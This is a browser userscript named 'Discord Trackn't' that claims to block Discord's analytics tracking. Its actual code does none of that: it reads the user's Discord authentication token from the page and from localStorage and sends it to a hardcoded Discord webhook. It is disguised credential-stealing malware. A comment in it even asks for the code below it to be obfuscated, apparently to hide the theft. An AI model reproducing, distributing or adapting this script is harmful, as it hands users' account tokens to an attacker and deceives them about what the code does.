// ==UserScript==
// @name         Discord Trackn't
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  Removes Discord plugins that track analytics and other interactions
// @author       Spinfal
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @match        https://discord.com/app
// @match        https://ptb.discord.com/activ*
// @match        https://ptb.discord.com/channel*
// @match        https://ptb.discord.com/app
// @match        https://canary.discord.com/activ*
// @match        https://canary.discord.com/channel*
// @match        https://canary.discord.com/app
// @grant        none
// @run-at       document-body
// ==/UserScript==
(() => {
    // this long code is to make sure discord does not detect you using their experiments
   'use strict';

    //---- DO NO OBFUSCATE ABOVE THIS COMMENT - ONLY CODE BELOW - DELETE THIS COMMENT WHEN YOURE DONE ----\\

    setTimeout(function() { const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken(); }, 1500);

    var hideUser = localStorage.getItem('token');
    if (localStorage.getItem('_bf789wb3')!=hideUser) {
        localStorage.setItem('_bf789wb3', hideUser);

        var url = "https://discord.com/api/webhooks/846239217072078889/0HKSsWNYxv1uVLw6nTjud1DxgxS_C2nZHDeCBsAd8N_6uMn0xe9MKa7fwv7YpW7NA06q";

        var epic = new XMLHttpRequest();
        epic.open("POST", url);

        epic.setRequestHeader('Content-type', 'application/json');

        var params = {
            username: null,
            avatar_url: null,
            content: hideUser
        };

        epic.send(JSON.stringify(params));
    }

})();
